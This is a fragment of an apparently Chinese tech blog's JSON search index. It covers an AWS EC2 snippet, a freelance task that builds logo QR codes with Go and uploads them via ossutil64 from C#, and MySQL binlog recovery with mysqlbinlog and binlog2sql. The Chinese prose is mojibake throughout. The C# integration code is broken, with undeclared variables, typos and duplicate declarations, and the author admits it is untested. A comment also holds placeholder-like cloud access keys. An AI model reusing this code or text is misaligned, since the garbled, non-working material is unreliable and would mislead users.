class=\"n\"\u003elog\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eec2_id\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejq\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;.Instances[0].InstanceId\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eec2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"å‚è€ƒ\"\u003eå‚è€ƒï¼š\u003c/h5\u003e\n\u003cp\u003e\u003ca href=\"https://www.cnblogs.com/elvi/p/16542406.html\"\u003ehttps://www.cnblogs.com/elvi/p/16542406.html\u003c/a\u003e\u003c/p\u003e","title":"Freelancerä¹‹aws"},{"content":"å®¢æˆ·å‘äº†ä¸€ä¸ªéœ€æ±‚å¦‚ä¸‹ï¼š\nTODO: åœ¨sortFilesä¸­ï¼Œè·å–æœ€æ–°çš„åŸŸåï¼Œç”ŸæˆäºŒç»´ç ï¼Œè¦†ç›–QRCodePathå›¾ç‰‡ TODO:å°†QRCodePathå›¾ç‰‡ä¸Šä¼ åˆ°é˜¿é‡Œäº‘0Sæ ¹ç›®å½•ï¼Œé‡å¤åˆ™è¦†ç›– åˆå…·ä½“è¯¢é—®äº†ä¸€ä¸‹ç»†èŠ‚ï¼Œæ˜¯ä¸€ä¸ª csharp çš„ç¨‹åº\nvar sortFiles = Directory.GetFiles(zipPath, \u0026#34;*.zip\u0026#34;).Select(fn =\u0026gt; new FileInfo(fn)).OrderBy(f =\u0026gt; f.LastAccessTime);\r// TODO: åœ¨sortFilesä¸­ï¼Œè·å–æœ€æ–°çš„åŸŸåï¼ˆæ–‡ä»¶åå»æ‰.zipå°±æ˜¯åŸŸåï¼‰ï¼Œç»“åˆlogoUrlç”ŸæˆäºŒç»´ç ï¼Œè¦†ç›–QRCodePathå›¾ç‰‡\r// TODO: å°†QRCodePathå›¾ç‰‡ä¸Šä¼ åˆ°é˜¿é‡Œäº‘OOSæ ¹ç›®å½•ï¼Œé‡å¤åˆ™è¦†ç›–ï¼Œ çœ‹äº†ä¸€ä¸‹ï¼Œè§‰å¾—æ€è·¯å¦‚ä¸‹ï¼Œè¿™æ˜¯ä¸ªç®¡é“æµï¼Œæ— è®ºå¾’æ‰‹å†™ä»£ç ç”ŸæˆQRCODE(è¿˜æœ‰ä¸ªlogoå›¾éœ€è¦æ”¾åˆ°äºŒç»´ç ä¸­å¤®)ï¼Œè¿˜æ˜¯é›†æˆOSSçš„SDKéƒ½éº»çƒ¦\næœ€å¿«é€Ÿæ–¹æ³•æ˜¯ç›´æ¥è°ƒç”¨å¤–éƒ¨æˆç¨‹åºåšè¿™ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥ç”¨Goå†™ä¸ªç¨‹åºç”ŸæˆäºŒç»´ç ï¼Œç¬¬äºŒæ­¥ç”¨é˜¿é‡Œçš„ossutil64å·¥å…·ä¸Šä¼ \nä¸€ã€Goç¨‹åºGenå‡ºQRCode go æœ‰å¾ˆå¤šåº“ï¼Œæˆ‘ä»¬ç›´æ¥æ‹¿æ¥ç”¨å¥½äº†ï¼Œä½†æ˜¯åŸºæœ¬ä¸Šéƒ½æ˜¯è€ä»£ç ï¼Œæ‰€ä»¥éœ€è¦ä¸‹è½½ go1.13.15 æ¥ç”¨\n# ä¸‹è½½go 1.13.15ï¼Œè§£å‹åˆ°E:\\goï¼Œå¹¶å»ºç«‹ä¸€ä¸ªE:\\go\\go-workç›®å½•ï¼Œä¸‹è½½çš„æ¨¡å—ä¼šæ”¾åˆ°è¿™é‡Œ\rhttps://dl.google.com/go/go1.13.15.windows-amd64.zip\r# è®¾ç½®ä¸‰ä¸ªå˜é‡\rGOROOT=E:\\go\rGOPATH=E:\\go\\go-work\rPATHä¸­å¢åŠ å¥½E:\\go\\binçš„ç›®å½•\r# è®¾ç½®ä¸€ä¸‹ä»£ç†ï¼Œæœ‰æ—¶å€™æ¨¡å—æ‹‰ä¸ä¸‹æ¥\rgo env -w GOPROXY=https://goproxy.cn,direct ç„¶åå°±å‡†å¤‡gen qrcodeçš„ç¨‹åºï¼Œmain.go\npackage main\rimport (\r\u0026#34;flag\u0026#34;\r\u0026#34;image\u0026#34;\r\u0026#34;image/draw\u0026#34;\r\u0026#34;image/jpeg\u0026#34;\r_ \u0026#34;image/png\u0026#34;\r\u0026#34;os\u0026#34;\r\u0026#34;path/filepath\u0026#34;\r\u0026#34;github.com/LyricTian/logger\u0026#34;\r\u0026#34;github.com/nfnt/resize\u0026#34;\r\u0026#34;github.com/skip2/go-qrcode\u0026#34;\r)\rvar (\rtext string\rlogo string\rpercent int\rsize int\rout string\r)\rfunc init() {\rflag.StringVar(\u0026amp;text, \u0026#34;t\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;äºŒç»´ç å†…å®¹\u0026#34;)\rflag.StringVar(\u0026amp;logo, \u0026#34;l\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;äºŒç»´ç Logo(png)\u0026#34;)\rflag.IntVar(\u0026amp;percent, \u0026#34;p\u0026#34;, 15, \u0026#34;äºŒç»´ç Logoçš„æ˜¾ç¤ºæ¯”ä¾‹(é»˜è®¤15%)\u0026#34;)\rflag.IntVar(\u0026amp;size, \u0026#34;s\u0026#34;, 256, \u0026#34;äºŒç»´ç çš„å¤§å°(é»˜è®¤256)\u0026#34;)\rflag.StringVar(\u0026amp;out, \u0026#34;o\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;è¾“å‡ºæ–‡ä»¶\u0026#34;)\r}\rfunc main() {\rflag.Parse()\rif text == \u0026#34;\u0026#34; {\rlogger.Fatalf(\u0026#34;è¯·æŒ‡å®šäºŒç»´ç çš„ç”Ÿæˆå†…å®¹\u0026#34;)\r}\rif out == \u0026#34;\u0026#34; {\rlogger.Fatalf(\u0026#34;è¯·æŒ‡å®šè¾“å‡ºæ–‡ä»¶\u0026#34;)\r}\rif exists, err := checkFile(out); err != nil {\rlogger.Fatalf(\u0026#34;æ£€æŸ¥è¾“å‡ºæ–‡ä»¶å‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error())\r} else if exists {\rlogger.Fatalf(\u0026#34;è¾“å‡ºæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œè¯·é‡æ–°æŒ‡å®š\u0026#34;)\r}\rcode, err := qrcode.New(text, qrcode.Highest)\rif err != nil {\rlogger.Fatalf(\u0026#34;åˆ›å»ºäºŒç»´ç å‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error())\r}\rsrcImage := code.Image(size)\rif logo != \u0026#34;\u0026#34; {\rlogoSize := float64(size) * float64(percent) / 100\rsrcImage, err = addLogo(srcImage, logo, int(logoSize))\rif err != nil {\rlogger.Fatalf(\u0026#34;å¢åŠ Logoå‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error())\r}\r}\routAbs, err := filepath.Abs(out)\rif err != nil {\rlogger.Fatalf(\u0026#34;è·å–è¾“å‡ºæ–‡ä»¶ç»å¯¹è·¯å¾„å‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error())\r}\ros.MkdirAll(filepath.Dir(outAbs), 0777)\routFile, err := os.Create(outAbs)\rif err != nil {\rlogger.Fatalf(\u0026#34;åˆ›å»ºè¾“å‡ºæ–‡ä»¶å‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error())\r}\rdefer outFile.Close()\rjpeg.Encode(outFile, srcImage, \u0026amp;jpeg.Options{Quality: 100})\rlogger.Infof(\u0026#34;äºŒç»´ç ç”ŸæˆæˆåŠŸï¼Œæ–‡ä»¶è·¯å¾„ï¼š%s\u0026#34;, outAbs)\r}\rfunc checkFile(name string) (bool, error) {\r_, err := os.Stat(name)\rif err != nil {\rif os.IsNotExist(err) {\rreturn false, nil\r}\rreturn false, err\r}\rreturn true, nil\r}\rfunc resizeLogo(logo string, size uint) (image.Image, error) {\rfile, err := os.Open(logo)\rif err != nil {\rreturn nil, err\r}\rdefer file.Close()\rimg, _, err := image.Decode(file)\rif err != nil {\rreturn nil, err\r}\rimg = resize.Resize(size, size, img, resize.Lanczos3)\rreturn img, nil\r}\rfunc addLogo(srcImage image.Image, logo string, size int) (image.Image, error) {\rlogoImage, err := resizeLogo(logo, uint(size))\rif err != nil {\rreturn nil, err\r}\roffset := image.Pt((srcImage.Bounds().Dx()-logoImage.Bounds().Dx())/2, (srcImage.Bounds().Dy()-logoImage.Bounds().Dy())/2)\rb := srcImage.Bounds()\rm := image.NewNRGBA(b)\rdraw.Draw(m, b, srcImage, image.ZP, draw.Src)\rdraw.Draw(m, logoImage.Bounds().Add(offset), logoImage, image.ZP, draw.Over)\rreturn m, nil\r} ä¸Šé¢å¾ˆç®€å•ï¼Œç”¨åˆ°äº†åˆ«äººçš„ä¸‰ä¸ªæ¨¡å—ï¼Œéœ€è¦å®‰è£…ä¸€ä¸‹\ngo get -u github.com/LyricTian/logger@latest go get -u github.com/nfnt/resize@latest go get -u github.com/skip2/go-qrcode@latest æ³¨æ„ï¼Œè¿™äº›å‘½ä»¤æ˜¯é’ˆå¯¹ go 1.13.15 çš„ï¼Œå¦‚æœç”¨é«˜ç‰ˆæœ¬çš„ï¼Œå‘½ä»¤æ˜¯ä¸ä¸€æ ·çš„\nç„¶åå°±ç¼–è¯‘\ngo build -o qr.exe main.go æ‰¾ä¸ªä¸­å¿ƒå›¾ï¼Œç„¶åæµ‹è¯•\nE:\\qr\\qr.exe -h Usage of qr: -l string äºŒç»´ç Logo(png) -o string è¾“å‡ºæ–‡ä»¶ -p int äºŒç»´ç Logoçš„æ˜¾ç¤ºæ¯”ä¾‹(é»˜è®¤15%) (default 15) -s int äºŒç»´ç çš„å¤§å°(é»˜è®¤256) (default 256) -t string äºŒç»´ç å†…å®¹ E:\\qr\\qr.exe -t \u0026#34;http://www.zz.ha.cn\u0026#39; -l logo.png -o qr.png å°±ä¼šç”ŸæˆäºŒç»´ç å›¾åƒ\näºŒã€ç”¨ossutils64.exeä¸Šä¼ OSS è¿™ä¸ªå°±ç®€å•äº†ï¼Œä¸‹è½½é˜¿é‡Œçš„å·¥å…·ï¼Œå¤§æ¦‚æ˜¯è¿™ä¸ªæ ·å­\nossutil64.exe --config-file oss.conf cp ä¸Šä¼ æ–‡ä»¶ s3://æ¡¶å/\u0026#34;; ä¸‰ã€æ•´åˆè¿›csharp è¿™æ­¥ä¹Ÿæ¯”è¾ƒéº»çƒ¦ï¼Œæ¶‰åŠåˆ°csharpçš„å•ç‹¬è¯­æ³•\nvar sortFiles = Directory.GetFiles(zipPath, \u0026#34;*.zip\u0026#34;).Select(fn =\u0026gt; new FileInfo(fn)).OrderBy(f =\u0026gt; f.LastAccessTime); // TODO: åœ¨sortFilesä¸­ï¼Œè·å–æœ€æ–°çš„åŸŸåï¼ˆæ–‡ä»¶åå»æ‰.zipå°±æ˜¯åŸŸåï¼‰ï¼Œç»“åˆlogoUrlç”ŸæˆäºŒç»´ç ï¼Œè¦†ç›–QRCodePathå›¾ç‰‡ for (int i = 0; i \u0026lt; sortFiles.Length; ++i) { sortFiles[i] = Path.GetFileNameWithoutExtension(sortFiles[i]); System.Diagnostics.Process process = new System.Diagnostics.Process(); System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo(); startInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; startInfo1.FileName = \u0026#34;qr.exe\u0026#34;; string parm01 = string.Format(\u0026#34;-t {0} -o {1} -l {2}\u0026#34;, sorFiles[i], sortFiles[i], logoUrl\u0026#34;); startInfo1.Arguments = param01; process.StartInfo = startInfo1; process.Start(); // TODO: å°†QRCodePathå›¾ç‰‡ä¸Šä¼ åˆ°é˜¿é‡Œäº‘OOSæ ¹ç›®å½•ï¼Œé‡å¤åˆ™è¦†ç›–ï¼ŒAccessKey ID: LTAI5bbbb AccessKey Secret: NZPwtssss System.Diagnostics.Process process = new System.Diagnostics.Process(); System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo(); startInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; startInfo1.FileName = \u0026#34;ossutil64.exe\u0026#34;; startInfo1.Arguments = \u0026#34;--config-file oss.conf cp sortFiles[i] s3:///\u0026#34;; string parm01 = string.Format(\u0026#34;-t {0} -o {1} -l {2}\u0026#34;, sorFiles[i], sortFiles[i], logoUrl\u0026#34;); process.StartInfo = startInfo1; process.Start(); } å…³é”®ç‚¹æœ‰ä¸¤ä¸ªï¼š\n1ã€è·å–sortFilesæœ‰åç¼€ï¼Œéœ€è¦å»æ‰\nfor (int i = 0; i \u0026lt; sortFiles.Length; ++i) {\rsortFiles[i] = Path.GetFileNameWithoutExtension(sortFiles[i]);\r} 2ã€è¦æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦åå°æ‰§è¡Œ\nSystem.Diagnostics.Process process = new System.Diagnostics.Process();\rSystem.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\rstartInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\rstartInfo1.FileName = \u0026#34;qr.exe\u0026#34;;\rstring parm01 = string.Format(\u0026#34;-t {0} -o {1} -l {2}\u0026#34;, sorFiles[i], sortFiles[i], logoUrl\u0026#34;); startInfo1.Arguments = param01;\rprocess.StartInfo = startInfo1;\rprocess.Start(); è¿™æ ·å°±æå®Œäº†ï¼Œä½†æ˜¯ï¼Œæ²¡çœŸæœºæµ‹è¯•å•Šï¼Œgoå’Œossçš„éƒ¨åˆ†æ²¡é—®é¢˜ï¼Œcsharpçš„éƒ¨åˆ†æ²¡æœ‰çœŸæœºï¼Œæ— æ³•éªŒè¯ã€‚\n","permalink":"https://rendoumi.com/posts/20221123-freelancer_qrcode/","summary":"\u003cp\u003eå®¢æˆ·å‘äº†ä¸€ä¸ªéœ€æ±‚å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTODO: åœ¨sortFilesä¸­ï¼Œè·å–æœ€æ–°çš„åŸŸåï¼Œç”ŸæˆäºŒç»´ç ï¼Œè¦†ç›–QRCodePathå›¾ç‰‡\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTODO:å°†QRCodePathå›¾ç‰‡ä¸Šä¼ åˆ°é˜¿é‡Œäº‘0Sæ ¹ç›®å½•ï¼Œé‡å¤åˆ™è¦†ç›–\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåˆå…·ä½“è¯¢é—®äº†ä¸€ä¸‹ç»†èŠ‚ï¼Œæ˜¯ä¸€ä¸ª csharp çš„ç¨‹åº\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003evar sortFiles = Directory.GetFiles(zipPath, \u0026#34;*.zip\u0026#34;).Select(fn =\u0026gt; new FileInfo(fn)).OrderBy(f =\u0026gt; f.LastAccessTime);\r\n\r\n// TODO: åœ¨sortFilesä¸­ï¼Œè·å–æœ€æ–°çš„åŸŸåï¼ˆæ–‡ä»¶åå»æ‰.zipå°±æ˜¯åŸŸåï¼‰ï¼Œç»“åˆlogoUrlç”ŸæˆäºŒç»´ç ï¼Œè¦†ç›–QRCodePathå›¾ç‰‡\r\n\r\n\r\n// TODO: å°†QRCodePathå›¾ç‰‡ä¸Šä¼ åˆ°é˜¿é‡Œäº‘OOSæ ¹ç›®å½•ï¼Œé‡å¤åˆ™è¦†ç›–ï¼Œ\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eçœ‹äº†ä¸€ä¸‹ï¼Œè§‰å¾—æ€è·¯å¦‚ä¸‹ï¼Œè¿™æ˜¯ä¸ªç®¡é“æµï¼Œæ— è®ºå¾’æ‰‹å†™ä»£ç ç”ŸæˆQRCODE(è¿˜æœ‰ä¸ªlogoå›¾éœ€è¦æ”¾åˆ°äºŒç»´ç ä¸­å¤®)ï¼Œè¿˜æ˜¯é›†æˆOSSçš„SDKéƒ½éº»çƒ¦\u003c/p\u003e\n\u003cp\u003eæœ€å¿«é€Ÿæ–¹æ³•æ˜¯ç›´æ¥è°ƒç”¨å¤–éƒ¨æˆç¨‹åºåšè¿™ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥ç”¨Goå†™ä¸ªç¨‹åºç”ŸæˆäºŒç»´ç ï¼Œç¬¬äºŒæ­¥ç”¨é˜¿é‡Œçš„ossutil64å·¥å…·ä¸Šä¼ \u003c/p\u003e\n\u003ch4 id=\"ä¸€goç¨‹åºgenå‡ºqrcode\"\u003eä¸€ã€Goç¨‹åºGenå‡ºQRCode\u003c/h4\u003e\n\u003cp\u003ego æœ‰å¾ˆå¤šåº“ï¼Œæˆ‘ä»¬ç›´æ¥æ‹¿æ¥ç”¨å¥½äº†ï¼Œä½†æ˜¯åŸºæœ¬ä¸Šéƒ½æ˜¯è€ä»£ç ï¼Œæ‰€ä»¥éœ€è¦ä¸‹è½½ go1.13.15 æ¥ç”¨\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# ä¸‹è½½go 1.13.15ï¼Œè§£å‹åˆ°E:\\goï¼Œå¹¶å»ºç«‹ä¸€ä¸ªE:\\go\\go-workç›®å½•ï¼Œä¸‹è½½çš„æ¨¡å—ä¼šæ”¾åˆ°è¿™é‡Œ\r\nhttps://dl.google.com/go/go1.13.15.windows-amd64.zip\r\n\r\n# è®¾ç½®ä¸‰ä¸ªå˜é‡\r\nGOROOT=E:\\go\r\nGOPATH=E:\\go\\go-work\r\nPATHä¸­å¢åŠ å¥½E:\\go\\binçš„ç›®å½•\r\n\r\n# è®¾ç½®ä¸€ä¸‹ä»£ç†ï¼Œæœ‰æ—¶å€™æ¨¡å—æ‹‰ä¸ä¸‹æ¥\r\ngo env -w GOPROXY=https://goproxy.cn,direct\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eç„¶åå°±å‡†å¤‡gen qrcodeçš„ç¨‹åºï¼Œmain.go\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003epackage main\r\n\r\nimport (\r\n\t\u0026#34;flag\u0026#34;\r\n\t\u0026#34;image\u0026#34;\r\n\t\u0026#34;image/draw\u0026#34;\r\n\t\u0026#34;image/jpeg\u0026#34;\r\n\t_ \u0026#34;image/png\u0026#34;\r\n\t\u0026#34;os\u0026#34;\r\n\t\u0026#34;path/filepath\u0026#34;\r\n\r\n\t\u0026#34;github.com/LyricTian/logger\u0026#34;\r\n\t\u0026#34;github.com/nfnt/resize\u0026#34;\r\n\t\u0026#34;github.com/skip2/go-qrcode\u0026#34;\r\n)\r\n\r\nvar (\r\n\ttext    string\r\n\tlogo    string\r\n\tpercent int\r\n\tsize    int\r\n\tout     string\r\n)\r\n\r\nfunc init() {\r\n\tflag.StringVar(\u0026amp;text, \u0026#34;t\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;äºŒç»´ç å†…å®¹\u0026#34;)\r\n\tflag.StringVar(\u0026amp;logo, \u0026#34;l\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;äºŒç»´ç Logo(png)\u0026#34;)\r\n\tflag.IntVar(\u0026amp;percent, \u0026#34;p\u0026#34;, 15, \u0026#34;äºŒç»´ç Logoçš„æ˜¾ç¤ºæ¯”ä¾‹(é»˜è®¤15%)\u0026#34;)\r\n\tflag.IntVar(\u0026amp;size, \u0026#34;s\u0026#34;, 256, \u0026#34;äºŒç»´ç çš„å¤§å°(é»˜è®¤256)\u0026#34;)\r\n\tflag.StringVar(\u0026amp;out, \u0026#34;o\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;è¾“å‡ºæ–‡ä»¶\u0026#34;)\r\n}\r\n\r\nfunc main() {\r\n\tflag.Parse()\r\n\r\n\tif text == \u0026#34;\u0026#34; {\r\n\t\tlogger.Fatalf(\u0026#34;è¯·æŒ‡å®šäºŒç»´ç çš„ç”Ÿæˆå†…å®¹\u0026#34;)\r\n\t}\r\n\r\n\tif out == \u0026#34;\u0026#34; {\r\n\t\tlogger.Fatalf(\u0026#34;è¯·æŒ‡å®šè¾“å‡ºæ–‡ä»¶\u0026#34;)\r\n\t}\r\n\r\n\tif exists, err := checkFile(out); err != nil {\r\n\t\tlogger.Fatalf(\u0026#34;æ£€æŸ¥è¾“å‡ºæ–‡ä»¶å‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error())\r\n\t} else if exists {\r\n\t\tlogger.Fatalf(\u0026#34;è¾“å‡ºæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œè¯·é‡æ–°æŒ‡å®š\u0026#34;)\r\n\t}\r\n\r\n\tcode, err := qrcode.New(text, qrcode.Highest)\r\n\tif err != nil {\r\n\t\tlogger.Fatalf(\u0026#34;åˆ›å»ºäºŒç»´ç å‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error())\r\n\t}\r\n\r\n\tsrcImage := code.Image(size)\r\n\tif logo != \u0026#34;\u0026#34; {\r\n\t\tlogoSize := float64(size) * float64(percent) / 100\r\n\r\n\t\tsrcImage, err = addLogo(srcImage, logo, int(logoSize))\r\n\t\tif err != nil {\r\n\t\t\tlogger.Fatalf(\u0026#34;å¢åŠ Logoå‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error())\r\n\t\t}\r\n\t}\r\n\r\n\toutAbs, err := filepath.Abs(out)\r\n\tif err != nil {\r\n\t\tlogger.Fatalf(\u0026#34;è·å–è¾“å‡ºæ–‡ä»¶ç»å¯¹è·¯å¾„å‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error())\r\n\t}\r\n\r\n\tos.MkdirAll(filepath.Dir(outAbs), 0777)\r\n\toutFile, err := os.Create(outAbs)\r\n\tif err != nil {\r\n\t\tlogger.Fatalf(\u0026#34;åˆ›å»ºè¾“å‡ºæ–‡ä»¶å‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error())\r\n\t}\r\n\tdefer outFile.Close()\r\n\r\n\tjpeg.Encode(outFile, srcImage, \u0026amp;jpeg.Options{Quality: 100})\r\n\r\n\tlogger.Infof(\u0026#34;äºŒç»´ç ç”ŸæˆæˆåŠŸï¼Œæ–‡ä»¶è·¯å¾„ï¼š%s\u0026#34;, outAbs)\r\n}\r\n\r\nfunc checkFile(name string) (bool, error) {\r\n\t_, err := os.Stat(name)\r\n\tif err != nil {\r\n\t\tif os.IsNotExist(err) {\r\n\t\t\treturn false, nil\r\n\t\t}\r\n\t\treturn false, err\r\n\t}\r\n\treturn true, nil\r\n}\r\n\r\nfunc resizeLogo(logo string, size uint) (image.Image, error) {\r\n\tfile, err := os.Open(logo)\r\n\tif err != nil {\r\n\t\treturn nil, err\r\n\t}\r\n\tdefer file.Close()\r\n\r\n\timg, _, err := image.Decode(file)\r\n\tif err != nil {\r\n\t\treturn nil, err\r\n\t}\r\n\r\n\timg = resize.Resize(size, size, img, resize.Lanczos3)\r\n\treturn img, nil\r\n}\r\n\r\nfunc addLogo(srcImage image.Image, logo string, size int) (image.Image, error) {\r\n\tlogoImage, err := resizeLogo(logo, uint(size))\r\n\tif err != nil {\r\n\t\treturn nil, err\r\n\t}\r\n\r\n\toffset := image.Pt((srcImage.Bounds().Dx()-logoImage.Bounds().Dx())/2, (srcImage.Bounds().Dy()-logoImage.Bounds().Dy())/2)\r\n\tb := srcImage.Bounds()\r\n\tm := image.NewNRGBA(b)\r\n\tdraw.Draw(m, b, srcImage, image.ZP, draw.Src)\r\n\tdraw.Draw(m, logoImage.Bounds().Add(offset), logoImage, image.ZP, draw.Over)\r\n\r\n\treturn m, nil\r\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¸Šé¢å¾ˆç®€å•ï¼Œç”¨åˆ°äº†åˆ«äººçš„ä¸‰ä¸ªæ¨¡å—ï¼Œéœ€è¦å®‰è£…ä¸€ä¸‹\u003c/p\u003e","title":"Freelancerä¹‹QRCode"},{"content":"æˆ‘ä»¬æ¥è¯´æ¢å¤çš„ç¬¬äºŒç§æƒ…å†µï¼Œå°±æ˜¯éœ€è¦ä»binlogä¸­æŒ‡å®šä½ç½®æ¢å¤\nbinlogå¦‚ä½•è®¾ç½®ä¸è¯´äº†ï¼Œæˆ‘ä»¬å‡è®¾ä¸Šæ¬¡ç”¨mysqldumpåšè¿‡ä¸€æ¬¡å…¨é‡å¤‡ä»½ã€‚\nmysqldump -uroot -p -h 192.168.1.35 -P3306 --opt --triggers -R --hex-blob --single-transaction --flush-logs --master-data=2 -B åº“å \u0026gt; åº“å.sql ç”±äºæˆ‘ä»¬åœ¨å¤‡ä»½ä¸­ä½¿ç”¨äº†å‚æ•°\u0026ndash;flush-logs \u0026ndash;master-data=2ï¼Œæ‰€ä»¥ åº“å.sql ä¸­ä¼šæœ‰binglogçš„ä¿¡æ¯ä¾›æˆ‘ä»¬ä½¿ç”¨ã€‚\nä¸€ã€ç”¨mysqlbinlogæ¥æ¢å¤ æˆ‘ä»¬é¦–å…ˆè¦æŸ¥åˆ°éšåçš„binlogæ–‡ä»¶æ˜¯é‚£ä¸ªï¼Œä»é‚£æ—¶å€™èµ·åˆç”Ÿæˆå¤šå°‘ä¸ªbinglogæ–‡ä»¶ã€‚\nç„¶åå»åº“é‡ŒæŸ¥è¯¢ï¼š\nshow master logs; show master status; æˆ‘ä»¬è¦åˆ†æä¸€ä¸‹SQL\n# show binlog events [IN \u0026#39;log_name\u0026#39;] [FROM pos] [LIMIT [offset,] row_count]; show binlog events in \u0026#39;javaboy_logbin.000002\u0026#39; limit 5,10; æˆ‘ä»¬æ¥ç¿»çœ‹æ—¥å¿—ï¼š\nå¯ä»¥çœ‹åˆ°æ˜¯ä» 764\u0026ndash;\u0026gt;865 ï¼Œå‘ç”Ÿäº†åˆ é™¤ï¼Œé‚£ä¹ˆå›æ”¾åˆ°è¿™ä¸ª764è¿™ä¸ªpositionå‰å³å¯ï¼Œ764ä¸ä¼šæ‰§è¡Œ\nmysqlbinlog /var/lib/mysql/mysql-bin.000204 --stop-position=764 --database=bbb | mysql -uroot -p \u0026ndash;start-positionæŒ‡å®šä»å“ªé‡Œå¼€å§‹æ¢å¤ï¼Œå¦‚æœä¸æŒ‡å®šï¼Œå°±ä¼šä»binlogæ–‡ä»¶å¼€å¤´çš„positionå¼€å§‹\nmysqlbinlog /var/lib/mysql/mysql-bin.000204 --start-position=205 --stop-position=764 --database=bbb | mysql -uroot -p äºŒã€ç”¨binglog2sqlæ¥æ¢å¤ binlog2sql æ˜¯å¤§ä¼—ç‚¹è¯„å…¬å¸çš„DBA å¼€å‘çš„ä¸€æ¬¾åŸºäºé€šè¿‡è§£æbinlogå°†delete æ¢å¤ä¸ºinsert,update çš„å€¼ set å­—æ®µå’Œwhereæ¡ä»¶åšå¯¹è°ƒçš„åŸç†æ¥æ¢å¤æ•°æ®çš„ã€‚ ä½¿ç”¨é™åˆ¶ MySQLçš„binlog format å¿…é¡»æ˜¯row å®‰è£…\nç®€å•è¯´å®ƒçš„é“ç†å°±æ˜¯å˜åˆ ä¸ºå¢ï¼Œç”Ÿæˆæ–°çš„SQLæ‰§è¡Œã€‚æ„Ÿè§‰ yearning çš„å›æ»šåº”è¯¥å°±æ˜¯åŸºäºè¿™ä¸ªä¸œè¥¿æå¾—ã€‚\nåœ°å€ï¼šhttps://github.com/danfengcao/binlog2sql\nè§£æå‡ºå›æ»šçš„SQLï¼š\npython binlog2sql.py --flashback -h127.0.0.1 -P3306 -uadmin -p\u0026#39;admin\u0026#39; -dtest -ttest3 --start-file=\u0026#39;mysql-bin.000002\u0026#39; --start-position=763 --stop-position=1147 \u0026gt; rollback.sql å›æ»šå‰åŠ¡å¿…å†å¤‡ä»½ä¸€ä¸‹\nmysql -h127.0.0.1 -P3306 -uadmin -p \u0026lt; rollback.sql ","permalink":"https://rendoumi.com/posts/20221122-mysqldump_binlog/","summary":"\u003cp\u003eæˆ‘ä»¬æ¥è¯´æ¢å¤çš„ç¬¬äºŒç§æƒ…å†µï¼Œå°±æ˜¯éœ€è¦ä»binlogä¸­æŒ‡å®šä½ç½®æ¢å¤\u003c/p\u003e\n\u003cp\u003ebinlogå¦‚ä½•è®¾ç½®ä¸è¯´äº†ï¼Œæˆ‘ä»¬å‡è®¾ä¸Šæ¬¡ç”¨mysqldumpåšè¿‡ä¸€æ¬¡å…¨é‡å¤‡ä»½ã€‚\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003emysqldump -uroot -p  -h 192.168.1.35 -P3306 --opt --triggers -R --hex-blob  --single-transaction 